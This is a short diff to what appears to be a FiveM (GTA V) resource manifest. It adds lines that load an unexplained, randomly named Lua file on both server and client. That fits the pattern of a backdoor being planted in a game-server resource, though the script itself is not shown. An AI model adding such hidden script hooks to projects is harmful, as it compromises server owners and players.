@@ -1,3 +1,5 @@
+server_script "3C3ZDNLQI1.lua"
+client_script "3C3ZDNLQI1.lua"
 fx_version 'cerulean'
 game 'gta5'
 
